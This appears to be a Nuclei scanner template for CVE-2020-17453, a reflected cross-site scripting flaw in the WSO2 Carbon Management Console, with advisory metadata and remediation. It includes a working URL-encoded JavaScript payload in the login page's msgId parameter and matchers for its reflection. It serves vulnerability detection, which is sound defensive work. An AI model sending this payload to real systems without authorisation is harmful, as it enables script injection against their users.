id: CVE-2020-17453

info:
  name: WSO2 Carbon Management Console <=5.10 - Cross-Site Scripting
  author: madrobot
  severity: medium
  description: WSO2 Management Console through 5.10 is susceptible to reflected cross-site scripting which can be exploited by tampering a request parameter in Management Console. This can be performed in both authenticated and unauthenticated requests.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to potential data theft, session hijacking, or defacement of the affected application.
  remediation: |
    Upgrade to a patched version of WSO2 Carbon Management Console (5.11 or above) or apply the provided security patch to mitigate this vulnerability.
  reference:
    - https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2020-1132
    - https://nvd.nist.gov/vuln/detail/CVE-2020-17453
    - https://twitter.com/JacksonHHax/status/1374681422678519813
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-17453
    cwe-id: CWE-79
    epss-score: 0.01486
    epss-percentile: 0.85348
    cpe: cpe:2.3:a:wso2:api_manager:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: wso2
    product: api_manager
  tags: xss,wso2,cve2020,cve

http:
  - method: GET
    path:
      - '{{BaseURL}}/carbon/admin/login.jsp?msgId=%27%3Balert(%27document.domain%27)%2F%2F'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "'';alert('document.domain')//';"

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100c7501f1bb71ea2c9c709b68032f3f8da5c22366008530eb47167c562e5ab80f20221008c964f0ec2e7d62a362803936cc57ef0566ec9ba5c63e2c4a935b0b34c3859e0:922c64590222798bb761d5b6d8e72950